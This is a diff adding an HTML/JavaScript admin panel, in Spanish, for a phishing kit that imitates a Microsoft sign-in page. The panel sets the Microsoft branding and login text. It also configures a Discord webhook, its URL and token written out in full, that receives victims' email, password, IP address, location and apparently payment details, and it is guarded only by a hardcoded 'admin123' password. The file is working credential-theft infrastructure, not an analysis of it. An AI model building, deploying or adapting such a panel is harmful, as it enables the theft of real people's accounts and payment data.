@@ -1,0 +1,742 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Panel de Administración</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+      body, html {
+        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        background: #f0f2f5;
+        min-height: 100vh;
+        color: #1b1b1b;
+      }
+      .sidebar {
+        width: 240px;
+        background: #1a1a2e;
+        color: #ffffff;
+        height: 100vh;
+        position: fixed;
+        left: 0;
+        top: 0;
+        padding: 20px 0;
+        overflow-y: auto;
+        z-index: 100;
+      }
+      .sidebar .logo {
+        padding: 0 20px 20px;
+        border-bottom: 1px solid #2a2a4a;
+        margin-bottom: 20px;
+      }
+      .sidebar .logo h1 {
+        font-size: 20px;
+        font-weight: 600;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .sidebar .logo h1 svg {
+        width: 24px;
+        height: 24px;
+      }
+      .sidebar nav {
+        padding: 0 10px;
+      }
+      .sidebar nav a {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 10px 16px;
+        color: #cbd5e1;
+        text-decoration: none;
+        border-radius: 6px;
+        margin-bottom: 4px;
+        transition: all 0.2s;
+        font-size: 14px;
+      }
+      .sidebar nav a:hover {
+        background: #2a2a4a;
+        color: #ffffff;
+      }
+      .sidebar nav a.active {
+        background: #0078d4;
+        color: #ffffff;
+      }
+      .sidebar nav a.active svg {
+        color: #ffffff;
+      }
+      .sidebar nav a svg {
+        width: 18px;
+        height: 18px;
+        color: #94a3b8;
+      }
+      .sidebar .admin-info {
+        margin-top: auto;
+        padding: 16px 20px;
+        border-top: 1px solid #2a2a4a;
+        color: #94a3b8;
+        font-size: 12px;
+      }
+      .main-content {
+        margin-left: 240px;
+        padding: 30px;
+        min-height: 100vh;
+      }
+      .tab-content {
+        display: none;
+      }
+      .tab-content.active {
+        display: block;
+      }
+      .tab-content h2 {
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 20px;
+        color: #1a1a2e;
+      }
+      .tab-content h3 {
+        font-size: 16px;
+        font-weight: 600;
+        margin: 20px 0 12px;
+        color: #334155;
+      }
+      .form-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 16px;
+      }
+      .form-group {
+        margin-bottom: 16px;
+      }
+      .form-group.full {
+        grid-column: 1 / -1;
+      }
+      .form-label {
+        display: block;
+        font-size: 13px;
+        font-weight: 500;
+        color: #475569;
+        margin-bottom: 6px;
+      }
+      .form-input {
+        width: 100%;
+        padding: 10px 12px;
+        border: 1px solid #d1d5db;
+        border-radius: 6px;
+        font-size: 14px;
+        background: #fff;
+        transition: border-color 0.2s;
+      }
+      .form-input:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+      }
+      .form-textarea {
+        width: 100%;
+        padding: 10px 12px;
+        border: 1px solid #d1d5db;
+        border-radius: 6px;
+        font-size: 14px;
+        background: #fff;
+        min-height: 100px;
+        font-family: monospace;
+        resize: vertical;
+      }
+      .form-textarea:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+      }
+      .form-select {
+        width: 100%;
+        padding: 10px 12px;
+        border: 1px solid #d1d5db;
+        border-radius: 6px;
+        font-size: 14px;
+        background: #fff;
+        cursor: pointer;
+      }
+      .form-select:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+      }
+      .toggle-switch {
+        position: relative;
+        display: inline-block;
+        width: 44px;
+        height: 24px;
+      }
+      .toggle-switch input {
+        opacity: 0;
+        width: 0;
+        height: 0;
+      }
+      .toggle-slider {
+        position: absolute;
+        cursor: pointer;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: #cbd5e1;
+        transition: .3s;
+        border-radius: 24px;
+      }
+      .toggle-slider:before {
+        position: absolute;
+        content: "";
+        height: 18px;
+        width: 18px;
+        left: 3px;
+        bottom: 3px;
+        background: white;
+        transition: .3s;
+        border-radius: 50%;
+      }
+      input:checked + .toggle-slider {
+        background: #0078d4;
+      }
+      input:checked + .toggle-slider:before {
+        transform: translateX(20px);
+      }
+      .btn-save {
+        background: #0078d4;
+        color: white;
+        border: none;
+        padding: 10px 24px;
+        border-radius: 6px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+      }
+      .btn-save:hover { background: #106ebe; }
+      .btn-save:disabled { background: #8a8886; cursor: not-allowed; }
+      .btn-reset {
+        background: #605e5c;
+        color: white;
+        border: none;
+        padding: 10px 24px;
+        border-radius: 6px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+        margin-left: 12px;
+      }
+      .btn-reset:hover { background: #403e3c; }
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        padding: 4px 10px;
+        border-radius: 9999px;
+        font-size: 12px;
+        font-weight: 600;
+      }
+      .badge-green { background: #dcfce7; color: #166534; }
+      .badge-red { background: #fee2e2; color: #991b1b; }
+      .badge-yellow { background: #fef3c7; color: #92400e; }
+      .badge-blue { background: #dbeafe; color: #1e40af; }
+      .preview-box {
+        border: 1px solid #d1d5db;
+        border-radius: 6px;
+        padding: 12px;
+        margin-top: 8px;
+        background: #f9fafb;
+        text-align: center;
+        font-size: 13px;
+        color: #6b7280;
+      }
+      .status-bar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 16px 24px;
+        background: #fff;
+        border-bottom: 1px solid #e5e5e5;
+        position: sticky;
+        top: 0;
+        z-index: 10;
+      }
+      .status-bar h1 {
+        font-size: 18px;
+        font-weight: 600;
+        color: #1a1a2e;
+      }
+      .status-bar .actions {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .status-bar .actions .status-text {
+        font-size: 13px;
+        color: #6b7280;
+      }
+      .tooltip {
+        position: relative;
+        display: inline-block;
+      }
+      .tooltip .tooltip-text {
+        visibility: hidden;
+        width: 200px;
+        background: #1a1a2e;
+        color: #fff;
+        text-align: center;
+        border-radius: 6px;
+        padding: 8px;
+        position: absolute;
+        z-index: 1;
+        bottom: 125%;
+        left: 50%;
+        transform: translateX(-50%);
+        opacity: 0;
+        transition: opacity 0.2s;
+        font-size: 12px;
+        white-space: nowrap;
+      }
+      .tooltip:hover .tooltip-text {
+        visibility: visible;
+        opacity: 1;
+      }
+      .tab-indicator {
+        display: flex;
+        gap: 4px;
+        margin-bottom: -1px;
+      }
+      .tab-indicator button {
+        padding: 12px 20px;
+        border: none;
+        background: #f8fafc;
+        border-bottom: 3px solid transparent;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+        color: #64748b;
+      }
+      .tab-indicator button:hover {
+        background: #f1f5f9;
+        color: #334155;
+      }
+      .tab-indicator button.active {
+        background: #fff;
+        border-bottom-color: #0078d4;
+        color: #0078d4;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Session check - password admin123 -->
+    <script>
+      (function() {
+        // Check if already authenticated via session
+        const isAuthenticated = sessionStorage.getItem('admin_auth') === 'true';
+        if (!isAuthenticated) {
+          const password = prompt('Ingrese la contraseña de administrador:');
+          if (password === 'admin123') {
+            sessionStorage.setItem('admin_auth', 'true');
+          } else {
+            alert('Contraseña incorrecta.');
+            window.history.back();
+          }
+        }
+      })();
+    </script>
+
+    <!-- Sidebar -->
+    <div class="sidebar">
+      <div class="logo">
+        <h1>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.517a9 9 0 11-3.877 3.848 12 12 0 413.855-3.848zM9 12h6m-3 3l3-3-3-3"></path>
+          </svg>
+          Panel Admin
+        </h1>
+      </div>
+      <nav>
+        <a href="#" onclick="showTab('appearance')" class="tab-link active">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 20h10M7 20l.89-4.41c.1.02.2.04.31.04h5.6M7 20L7 4h10l4 4v12M7 20l4-4h6"></path>
+          </svg>
+          Apariencia
+        </a>
+        <a href="#" onclick="showTab('discord')" class="tab-link">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9a3 3 0 100 6 3 3 0 000-6zM12 1l3 8h8l-6.5 5 2.5 8-6.5-5-6.5 5 2.5-8-6.5-5h8l3-8z"></path>
+          </svg>
+          Discord
+        </a>
+        <a href="#" onclick="showTab('content')" class="tab-link">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 17h2M12 12V5M5 12L3 9m0 0l2 2m-2-2l2-2M9 5a7 7 0 11-7 7 7 7 0 017-7zm7 13a7 7 0 11-7-7 7 7 0 017 7z"></path>
+          </svg>
+          Contenido
+        </a>
+      </nav>
+      <div class="admin-info">
+        <div>Usuario: admin</div>
+        <div>Panel mail-office-3656</div>
+      </div>
+    </div>
+
+    <!-- Main content -->
+    <div class="main-content">
+      <!-- Status bar -->
+      <div class="status-bar">
+        <h1 id="tabTitle">Apariencia</h1>
+        <div class="actions">
+          <span class="status-text" id="saveStatus">Sin cambios</span>
+          <button class="btn-save" id="saveBtn" onclick="saveConfig()">Guardar cambios</button>
+          <button class="btn-reset" onclick="resetConfig()">Restablecer</button>
+        </div>
+      </div>
+
+      <!-- Tabs -->
+      <div class="tab-indicator" id="tabIndicator">
+        <button class="tab-tab active" onclick="showTab('appearance')">Apariencia</button>
+        <button class="tab-tab" onclick="showTab('discord')">Discord</button>
+        <button class="tab-tab" onclick="showTab('content')">Contenido</button>
+      </div>
+
+      <!-- Tab: Apariencia (Appearance) -->
+      <div id="tab-appearance" class="tab-content active">
+        <h2>Apariencia del Login</h2>
+
+        <div class="form-grid">
+          <!-- Logo settings -->
+          <div class="form-group">
+            <label class="form-label">Texto del logo</label>
+            <input type="text" id="logoText" class="form-input" placeholder="Microsoft" value="Microsoft">
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Mostrar logo</label>
+            <div class="toggle-container">
+              <label class="toggle-switch">
+                <input type="checkbox" id="showLogo" checked>
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+          </div>
+
+          <!-- Title and subtitle -->
+          <div class="form-group full">
+            <label class="form-label">Título de login</label>
+            <input type="text" id="loginTitle" class="form-input" placeholder="Iniciar sesión" value="Iniciar sesión">
+          </div>
+
+          <div class="form-group full">
+            <label class="form-label">Subtítulo de login</label>
+            <input type="text" id="loginSubtitle" class="form-input" placeholder="Usar su cuenta de Microsoft." value="Usar su cuenta de Microsoft.">
+          </div>
+
+          <div class="form-group full">
+            <label class="form-label">Texto del botón</label>
+            <input type="text" id="loginButton" class="form-input" placeholder="Siguiente" value="Siguiente">
+          </div>
+
+          <!-- Background settings -->
+          <h3>Configuración de fondo de pantalla</h3>
+
+          <div class="form-group">
+            <label class="form-label">Tipo de fondo</label>
+            <select id="loginBgType" class="form-select">
+              <option value="image">Imagen</option>
+              <option value="gradient">Gradiente</option>
+              <option value="color">Color sólido</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Color de fondo</label>
+            <input type="text" id="loginBgColor" class="form-input" placeholder="#0a0a1a" value="#0a0a1a">
+          </div>
+
+          <div class="form-group full">
+            <label class="form-label">URL de imagen de fondo</label>
+            <input type="text" id="loginBgImage" class="form-input" placeholder="https://logincdn.msftauth.net/..." value="https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg">
+            <div class="preview-box" id="bgImagePreview">
+              Vista previa: La imagen se aplicará como fondo del login
+            </div>
+          </div>
+
+          <div class="form-group full">
+            <label class="form-label">Gradiente de fondo</label>
+            <input type="text" id="loginBgGradient" class="form-input" placeholder="linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)" value="linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)">
+          </div>
+
+          <div class="form-group full">
+            <label class="form-label">Fondo de la tarjeta de login</label>
+            <input type="text" id="loginCardBg" class="form-input" placeholder="rgba(255, 255, 255, 0.15)" value="rgba(255, 255, 255, 0.15)">
+            <div class="preview-box" id="cardBgPreview">
+              Configura el fondo semitransparente de la tarjeta de login
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Overlay de fondo</label>
+            <div class="toggle-container">
+              <label class="toggle-switch">
+                <input type="checkbox" id="loginBgOverlay" checked>
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Favicon</label>
+            <input type="text" id="favicon" class="form-input" placeholder="/favicon.svg" value="/favicon.svg">
+          </div>
+        </div>
+      </div>
+
+      <!-- Tab: Discord -->
+      <div id="tab-discord" class="tab-content">
+        <h2>Configuración de Discord</h2>
+
+        <div class="form-grid">
+          <div class="form-group full">
+            <label class="form-label">Webhook de Discord</label>
+            <input type="text" id="discordWebhook" class="form-input" placeholder="https://discord.com/api/webhooks/..." value="https://discord.com/api/webhooks/1552922193904533585/qFZTJm-dvi8rtMebse3E46vYEJHiRUMPCOT431ObwBflrQM0B0pYoaiEWZVolklwl0mk">
+            <div class="preview-box">
+              <span class="badge badge-green">Conectado</span>
+            </div>
+          </div>
+
+          <div class="form-group full">
+            <label class="form-label">Plantilla de mensaje (opcional)</label>
+            <textarea id="discordMessageTemplate" class="form-textarea" placeholder="Deja en blanco para usar la plantilla por defecto. Usa {email}, {password}, {ip}, {geoCity}, {geoCountry}..."></textarea>
+          </div>
+
+          <div class="form-group full">
+            <h3>Estado del webhook</h3>
+            <div>
+              <span class="badge badge-green">✓ Activo</span>
+              <span class="badge badge-blue">Login + Pago separados</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tab: Contenido -->
+      <div id="tab-content" class="tab-content">
+        <h2>Contenido y seguridad</h2>
+
+        <div class="form-grid">
+          <div class="form-group full">
+            <h3>Contraseña de administración</h3>
+            <input type="text" id="adminPassword" class="form-input" placeholder="admin123" value="admin123">
+            <div class="preview-box">
+              Contraseña para acceder al panel de administración
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Acceso admin habilitado</label>
+            <div class="toggle-container">
+              <label class="toggle-switch">
+                <input type="checkbox" id="adminAccessEnabled" checked>
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+          </div>
+
+          <div class="form-group full">
+            <h3>Configuración de red</h3>
+            <div class="preview-box">
+              <div style="margin-bottom: 8px;">
+                <span class="badge badge-blue">GitHub API</span>
+                <span style="font-size: 12px; color: #6b7280; margin-left: 8px;">Persistencia global</span>
+              </div>
+              <div style="font-size: 12px; color: #6b7280;">
+                Cambios se guardan en GitHub y se aplican globalmente
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer with tooltip -->
+    <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 py-2 z-50">
+      <div class="max-w-4xl mx-auto px-4">
+        <div class="flex flex-col sm:flex-row items-center justify-center gap-1 sm:gap-6 text-xs text-gray-500">
+          <span class="tooltip">
+            <a href="#" class="text-ms-blue">Ayuda</a>
+            <span class="tooltip-text">Obtenga ayuda sobre el panel de administración</span>
+          </span>
+          <a href="#" class="hover:text-ms-blue transition-colors">Términos de uso</a>
+          <a href="#" class="hover:text-ms-blue transition-colors">Privacidad y cookies</a>
+          <span class="text-center hidden sm:inline text-xs px-1">Usa la exploración privada si este no es tu dispositivo. <a href="#" class="text-ms-blue hover:underline">Más información</a></span>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      let currentConfig = {};
+      let hasChanges = false;
+
+      function showTab(tabName) {
+        // Hide all tabs
+        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+        document.querySelectorAll('.tab-tab').forEach(tab => tab.classList.remove('active'));
+        document.querySelectorAll('.sidebar .tab-link').forEach(link => link.classList.remove('active'));
+
+        // Show selected tab
+        document.getElementById('tab-' + tabName).classList.add('active');
+        document.querySelector('.tab-tab[onclick*="' + tabName + '"]').classList.add('active');
+        document.querySelector('.sidebar .tab-link[onclick*="' + tabName + '"]').classList.add('active');
+
+        // Update title
+        const titles = {
+          'appearance': 'Apariencia',
+          'discord': 'Discord',
+          'content': 'Contenido'
+        };
+        document.getElementById('tabTitle').textContent = titles[tabName];
+      }
+
+      async function loadConfig() {
+        try {
+          const res = await fetch('/api/config');
+          if (!res.ok) throw new Error('Config fetch failed');
+          const config = await res.json();
+          currentConfig = config;
+          populateForm(config);
+          document.getElementById('saveStatus').textContent = 'Configuración cargada';
+          setTimeout(() => {
+            document.getElementById('saveStatus').textContent = 'Sin cambios';
+          }, 2000);
+        } catch (err) {
+          console.warn('Could not load config:', err);
+          document.getElementById('saveStatus').textContent = 'Error al cargar config';
+        }
+      }
+
+      function populateForm(config) {
+        document.getElementById('logoText').value = config.logoText || 'Microsoft';
+        document.getElementById('showLogo').checked = config.showLogo !== false;
+        document.getElementById('loginTitle').value = config.loginTitle || 'Iniciar sesión';
+        document.getElementById('loginSubtitle').value = config.loginSubtitle || 'Usar su cuenta de Microsoft.';
+        document.getElementById('loginButton').value = config.loginButton || 'Siguiente';
+        document.getElementById('loginBgType').value = config.loginBgType || 'image';
+        document.getElementById('loginBgColor').value = config.loginBgColor || '#0a0a1a';
+        document.getElementById('loginBgImage').value = config.loginBgImage || 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg';
+        document.getElementById('loginBgGradient').value = config.loginBgGradient || 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)';
+        document.getElementById('loginCardBg').value = config.loginCardBg || 'rgba(255, 255, 255, 0.15)';
+        document.getElementById('loginBgOverlay').checked = config.loginBgOverlay !== false;
+        document.getElementById('favicon').value = config.favicon || '/favicon.svg';
+        document.getElementById('discordWebhook').value = config.discordWebhook || '';
+        document.getElementById('discordMessageTemplate').value = config.discordMessageTemplate || '';
+        document.getElementById('adminPassword').value = config.adminPassword || 'admin123';
+        document.getElementById('adminAccessEnabled').checked = config.adminAccessEnabled !== false;
+      }
+
+      function collectFormData() {
+        return {
+          logoText: document.getElementById('logoText').value,
+          showLogo: document.getElementById('showLogo').checked,
+          loginTitle: document.getElementById('loginTitle').value,
+          loginSubtitle: document.getElementById('loginSubtitle').value,
+          loginButton: document.getElementById('loginButton').value,
+          loginBgType: document.getElementById('loginBgType').value,
+          loginBgColor: document.getElementById('loginBgColor').value,
+          loginBgImage: document.getElementById('loginBgImage').value,
+          loginBgGradient: document.getElementById('loginBgGradient').value,
+          loginCardBg: document.getElementById('loginCardBg').value,
+          loginBgOverlay: document.getElementById('loginBgOverlay').checked,
+          favicon: document.getElementById('favicon').value,
+          discordWebhook: document.getElementById('discordWebhook').value,
+          discordMessageTemplate: document.getElementById('discordMessageTemplate').value,
+          adminPassword: document.getElementById('adminPassword').value,
+          adminAccessEnabled: document.getElementById('adminAccessEnabled').checked
+        };
+      }
+
+      async function saveConfig() {
+        const updates = collectFormData();
+        hasChanges = true;
+
+        try {
+          const res = await fetch('/api/config', {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(updates)
+          });
+
+          const result = await res.json();
+
+          if (res.ok && result.success) {
+            document.getElementById('saveStatus').textContent = 'Guardado correctamente';
+            // Save to localStorage for immediate preview
+            Object.keys(updates).forEach(key => {
+              try { localStorage.setItem(key, String(updates[key])); } catch(e) {}
+            });
+            setTimeout(() => {
+              document.getElementById('saveStatus').textContent = 'Sin cambios';
+            }, 3000);
+          } else {
+            document.getElementById('saveStatus').textContent = 'Error: ' + (result.error || 'Desconocido');
+          }
+        } catch (err) {
+          document.getElementById('saveStatus').textContent = 'Error de red';
+          console.error(err);
+        }
+      }
+
+      function resetConfig() {
+        const defaults = {
+          logoText: 'Microsoft',
+          showLogo: true,
+          loginTitle: 'Iniciar sesión',
+          loginSubtitle: 'Usar su cuenta de Microsoft.',
+          loginButton: 'Siguiente',
+          loginBgType: 'image',
+          loginBgColor: '#0a0a1a',
+          loginBgImage: 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg',
+          loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
+          loginCardBg: 'rgba(255, 255, 255, 0.15)',
+          loginBgOverlay: true,
+          favicon: '/favicon.svg',
+          discordWebhook: 'https://discord.com/api/webhooks/1552922193904533585/qFZTJm-dvi8rtMebse3E46vYEJHiRUMPCOT431ObwBflrQM0B0pYoaiEWZVolklwl0mk',
+          discordMessageTemplate: '',
+          adminPassword: 'admin123',
+          adminAccessEnabled: true
+        };
+
+        populateForm(defaults);
+        document.getElementById('saveStatus').textContent = 'Restablecido';
+        setTimeout(() => {
+          document.getElementById('saveStatus').textContent = 'Sin cambios';
+        }, 1000);
+      }
+
+      // Track changes
+      document.getElementById('logoText').addEventListener('input', () => markChanged());
+      document.getElementById('loginTitle').addEventListener('input', () => markChanged());
+      document.getElementById('loginSubtitle').addEventListener('input', () => markChanged());
+      document.getElementById('loginButton').addEventListener('input', () => markChanged());
+      document.getElementById('loginBgColor').addEventListener('input', () => markChanged());
+      document.getElementById('loginBgImage').addEventListener('input', () => markChanged());
+      document.getElementById('loginBgGradient').addEventListener('input', () => markChanged());
+      document.getElementById('loginCardBg').addEventListener('input', () => markChanged());
+      document.getElementById('favicon').addEventListener('input', () => markChanged());
+      document.getElementById('discordWebhook').addEventListener('input', () => markChanged());
+      document.getElementById('discordMessageTemplate').addEventListener('input', () => markChanged());
+      document.getElementById('adminPassword').addEventListener('input', () => markChanged());
+
+      function markChanged() {
+        if (!hasChanges) {
+          hasChanges = true;
+          document.getElementById('saveStatus').textContent = 'Cambios sin guardar';
+        }
+      }
+
+      // Initialize
+      loadConfig();
+    </script>
+  </body>
+</html>
